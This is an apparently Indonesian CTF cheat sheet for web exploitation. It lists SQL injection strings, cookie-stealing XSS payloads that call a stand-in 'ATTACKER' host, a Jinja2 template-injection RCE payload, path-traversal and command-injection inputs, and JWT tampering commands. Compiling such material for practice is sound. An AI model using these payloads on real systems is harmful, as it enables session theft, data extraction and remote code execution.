# WEB — Web Exploitation

> Kekuatan kamu. Pakai Burp buat intercept/replay tiap request.

## Triage
```bash
# recon cepat
curl -sI http://host:port            # header, Server, Set-Cookie
curl -s http://host:port | less      # HTML, komentar, JS source
# file bocoran
curl http://host:port/robots.txt http://host:port/.git/HEAD
ffuf -u http://host:port/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
Selalu: **View Source**, cek JS, cek `Set-Cookie`, cek param URL/form, buka DevTools Network.

## SQL Injection
- Deteksi: `'` → error; `' OR '1'='1`; `admin'--`.
- Union: `' UNION SELECT 1,2,3-- -` (sesuaikan jumlah kolom via `ORDER BY n`).
- Baca data: `UNION SELECT table_name,2 FROM information_schema.tables-- -`.
- Blind: boolean (`AND 1=1` vs `AND 1=2`) / time (`AND SLEEP(5)`).
- Auto: `sqlmap -u "http://host/?id=1" --batch --dbs` (hati-hati kalau dilarang tool otomatis).

## XSS (sering buat curi cookie admin bot)
```html
<script>fetch('//ATTACKER/?c='+document.cookie)</script>
<img src=x onerror="fetch('//ATTACKER/?c='+document.cookie)">
```
- Reflected: payload di param yang kepantul ke HTML.
- Report URL ke admin bot → cookie admin ke-exfil (pastiin endpoint attacker-mu reachable; kadab bot cuma boleh akses origin sendiri).
- Bypass filter: case, `oNeRror`, `<svg onload=>`, encoding.

## SSTI (template injection)
- Deteksi: `{{7*7}}` → `49`? atau `${7*7}`, `<%= 7*7 %>`.
- Jinja2 RCE: `{{ cycler.__init__.__globals__.os.popen('id').read() }}`
- Cek payload per engine (Jinja2/Twig/Freemarker) di PayloadsAllTheThings.

## LFI / Path Traversal
```
?page=../../../../etc/passwd
?page=../../../../flag
php://filter/convert.base64-encode/resource=index.php   # baca source PHP
```
- Log poisoning / `php://input` → RCE kalau include.

## Command Injection (mis. ping service)
```
8.8.8.8; cat /flag
8.8.8.8 | ls /
8.8.8.8 && cat /flag
`cat /flag`   atau  $(cat /flag)
```
- Filter spasi: `cat${IFS}/flag`. Filter `/`: cari env/var.

## JWT
```bash
python3 jwt_tool/jwt_tool.py <token> -T          # tamper
# alg=none bypass, atau brute secret HS256:
python3 jwt_tool/jwt_tool.py <token> -C -d wordlist.txt
```
- `alg:none`, key confusion (RS256→HS256 pakai public key sebagai secret).

## IDOR / Auth logic
- Ganti `id=`, `user=`, token → akses resource orang lain.
- Logic flaw: bandingin gimana token/flag DIBUAT vs DICEK (kasus KRS: course_id gak ikut dicek saat enroll).
- Race condition: kirim banyak request paralel.

## Gotcha penting
- **Content-Type**: kadang request diabaikan kalau header salah (`application/json`) → body gak kebaca.
- Cek **semua** HTTP method (GET/POST/PUT), header custom, cookie flag.

## Checklist stuck
- [ ] Baca source HTML+JS, komentar, endpoint tersembunyi?
- [ ] Semua param dicoba inject (SQLi/SSTI/cmd/LFI)?
- [ ] Cookie/JWT bisa ditamper?
- [ ] Logic: bandingin create vs verify.
- [ ] Content-Type / method bener?
